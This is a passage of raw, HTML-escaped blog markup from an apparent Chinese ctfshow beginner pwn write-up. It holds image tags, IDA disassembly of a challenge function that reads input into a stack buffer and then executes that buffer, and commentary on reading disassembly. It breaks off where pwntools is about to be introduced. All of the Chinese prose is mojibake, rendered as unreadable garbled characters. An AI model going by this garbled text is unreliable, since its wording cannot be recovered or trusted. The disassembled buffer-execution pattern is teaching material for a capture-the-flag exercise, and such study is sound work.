	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/63_hu_8320440ce8e9ad20.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/63_hu_f063bc9aa051b388.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;251&#34;
		data-flex-basis=&#34;604px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;çœ‹é¢˜ç›®æç¤ºï¼Œè¿›å…¥æ–°å¤§é™†äº†&amp;hellip;ç”¨pwntoolsäº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/64.png&#34;
	width=&#34;710&#34;
	height=&#34;295&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/64_hu_2df4fc228f333ed2.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/64_hu_ff2fcff08e5e36b.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;240&#34;
		data-flex-basis=&#34;577px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæœ‰æç¤ºï¼Œå¯ä»¥çœ‹ä¸€ä¸‹&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/pwn-1/#nx&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PWN-1-NXä¿æŠ¤&lt;/a&gt;ï¼Œæœ‰å•¥å¯å‘ï¼Ÿ&lt;/p&gt;
&lt;p&gt;åœ¨IDAåˆ†æå¯çŸ¥ï¼Œctfshowå‡½æ•°æ— æ³•è·Ÿè¿›æºä»£ç ï¼Œåªèƒ½çœ‹å®ƒçš„ä¼ªä»£ç å»åˆ†æäº†ï¼ˆæ¯”è¾ƒé•¿ï¼‰ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; =============== S U B R O U T I N E =======================================&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; Attributes: bp-based frame&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; int __cdecl ctfshow(_DWORD)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ctfshow&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ctfshow&lt;/span&gt;         &lt;span class=&#34;nv&#34;&gt;proc&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;near&lt;/span&gt;               &lt;span class=&#34;c1&#34;&gt;; CODE XREF: main+132â†“p&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt;             &lt;span class=&#34;err&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ptr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;88h&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;var_4&lt;/span&gt;           &lt;span class=&#34;err&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;dword&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ptr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; __unwind {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;nb&#34;&gt;ebp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C7&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C9&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;CA&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;sub&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;84h&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;D0&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;call&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;__x86_get_pc_thunk_bx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;D5&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;add&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;_GLOBAL_OFFSET_TABLE_&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;DB&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;sub&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;DE&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;mh&#34;&gt;100h&lt;/span&gt;            &lt;span class=&#34;c1&#34;&gt;; nbytes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;E3&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;lea&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;E9&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;             &lt;span class=&#34;c1&#34;&gt;; buf&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;EA&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;               &lt;span class=&#34;c1&#34;&gt;; fd&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;EC&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;call&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;_read&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;F1&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;add&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;10h&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;F4&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;sub&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0Ch&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;F7&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;lea&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;FD&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;             &lt;span class=&#34;c1&#34;&gt;; s&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;FE&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;call&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;_puts&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048503&lt;/span&gt;                 &lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;10h&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048506&lt;/span&gt;                 &lt;span class=&#34;nf&#34;&gt;lea&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;0804850&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;call&lt;/span&gt;    &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;0804850&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;E&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;nop&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;0804850&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;F&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;var_4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048512&lt;/span&gt;                 &lt;span class=&#34;nf&#34;&gt;leave&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048513&lt;/span&gt;                 &lt;span class=&#34;nf&#34;&gt;retn&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048513&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; } // starts at 80484C6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048513&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;ctfshow&lt;/span&gt;         &lt;span class=&#34;nv&#34;&gt;endp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048513&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048514&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048514&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; =============== S U B R O U T I N E =======================================&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;å¦‚æœä¹‹å‰æ˜¯æ‰“é€†å‘æˆ–è€…å¼ºè¡Œå…¥é—¨PWNçš„è¯ï¼Œæœ€åç‰¢çš„æˆ‘ç›¸ä¿¡åº”è¯¥æ˜¯ç”¨IDAå§ï¼Œé™¤äº†æ‰¾æ˜æ–‡å­—ç¬¦ä¸²flagå¤–ï¼Œä½ å­¦äº†æ±‡ç¼–è¯­è¨€ä½ ä¹Ÿçœ‹ä¸æ‡‚è¿™æ˜¯å•¥æ„æ€ï¼Œæ„Ÿè§‰ä¸€å°ä¸²æºä»£ç è½¬æ¢æˆæ±‡ç¼–è¯­è¨€éå¸¸é•¿ã€æ¯ç‡¥ï¼Œå…¶å®UPä¸»ä¹Ÿæ·±æœ‰ä½“ä¼šï¼Œåœ¨ç³»ç»Ÿæ€§å…¥é—¨åï¼Œä¹Ÿåˆæ­¥çŸ¥é“IDAæ˜¯æ€ä¹ˆç”¨çš„ï¼Œè¿™é‡Œæˆ‘æŠŠä¸‹åˆ’çº¿â€œ===== S U B R O U T I N E =====â€ä¹Ÿå¤åˆ¶è¿›æ¥äº†ï¼ŒæŒ‰æˆ‘ç†è§£è¿™æ˜¯å‡½æ•°åˆ†ç•Œï¼Œåˆ†éš”çº¿ä¸Šæ–¹æ˜¯å‰ä¸€ä¸ªå‡½æ•°çš„ç»“å°¾ï¼ˆé€šå¸¸ä»¥&lt;code&gt;retn&lt;/code&gt;æŒ‡ä»¤ç»“æŸï¼Œä»£è¡¨å‡½æ•°è¿”å›ï¼‰è¿‡äº†è¿™æ¡çº¿ï¼Œè¯´æ˜æ±‡ç¼–è¯­è¨€åœ¨æè¿°çš„å°±æ˜¯å¦å¤–ä¸€ä¸ªå‡½æ•°äº†ã€‚ä¹Ÿå°±æ˜¯è¯´è¿™ä¸Šä¸‹åˆ†ç•Œçº¿æ˜¯ä»£è¡¨å›Šæ‹¬ç€ä¸€ä¸ªå‡½æ•°ï¼Œä¾‹å¦‚è¿™ctfshowå‡½æ•°ã€‚&lt;/p&gt;
&lt;p&gt;å¦å¤–æˆ‘æƒ³è¯´çš„æ˜¯æ±‡ç¼–è¯­è¨€è¿™ä¹ˆé•¿æ˜¯æœ‰é“ç†çš„ï¼Œå®ƒæ›´åƒæ˜¯ä¸€ç§â€œå•°å—¦â€ï¼Œå®ƒèƒ½åœ¨æ¯ä¸€æ®µä»£ç è¿è¡Œåä¸æ–­å‘ä½ æ±‡æŠ¥åœ°å€å˜åŒ–ï¼Œè¿™ç§ â€œå•°å—¦â€ æœ¬è´¨ä¸Šæ˜¯&lt;strong&gt;å¯¹è®¡ç®—æœºåº•å±‚æ“ä½œçš„ç›´æ¥æ˜ å°„&lt;/strong&gt;ï¼Œè¿™ç§ç‰¹æ€§ç¡®å®è®©å®ƒåœ¨è·Ÿè¸ªç¨‹åºè¿è¡Œç»†èŠ‚ã€åˆ†æé€»è¾‘å’Œæ’æŸ¥é—®é¢˜æ—¶å…·æœ‰ç‹¬ç‰¹ä¼˜åŠ¿ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;ä»è¿™é‡Œå¼€å§‹å°±è¦ç”¨pwntoolsäº†ï¼Œè¿™é‡Œä»‹ç»ä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
